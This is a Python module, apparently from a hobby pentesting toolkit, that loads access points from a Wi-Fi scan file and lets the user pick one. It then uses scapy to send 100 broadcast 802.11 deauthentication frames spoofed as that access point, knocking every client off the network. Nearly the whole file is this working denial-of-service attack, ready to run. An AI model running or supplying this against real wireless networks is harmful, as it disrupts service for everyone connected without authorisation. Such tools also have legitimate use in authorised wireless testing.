import Pentesting.ModuleTools as Module
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.all import *
import Pentesting.Network.Scans.Monitor as Monitor


wifi_file = "Output/Wifi.txt"

ssid_list = []
bssid_list = []
chan_list = []


#############################
#                           #
#     Deauth of network     #
#                           #
#############################

def GetAP():
     with open(wifi_file, "r") as file:
        next(file)
        for line in file:
            parts = line.strip().split()
            if len(parts) >=2:
                ssid = parts[0]
                ssid_list.append(ssid)
                bssid = parts[1]
                bssid_list.append(bssid)
                chan = parts[3]
                chan_list.append(chan)


def Deauth(num):
    num = num - 1
    target_mac = "ff:ff:ff:ff:ff:ff" 
    gateway_mac = bssid_list[num]
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    print("Sending Deauth Frame to " + gateway_mac+"...")
    sendp(packet, inter=0.1, count=100, iface="wlan0", verbose=1)


def Start():
    reset = True
    Monitor.Start()
    GetAP()
    Module.clean()
    while reset:   
        Module.line()
        print(" ")
        for i in range(len(ssid_list)):
            print(f"[ {Module.TGREEN}{i + 1}{Module.TWHITE} ] " + ssid_list[i], bssid_list[i])
        keuze = int(input(f"\nMake a choice!\n--> "))
        if keuze <= 0:
            Module.clean()
            print("nee")
        elif keuze > i + 1:
            Module.clean()
            print("nee")
        else:
            print("ja")
            reset = False
            Deauth(keuze)
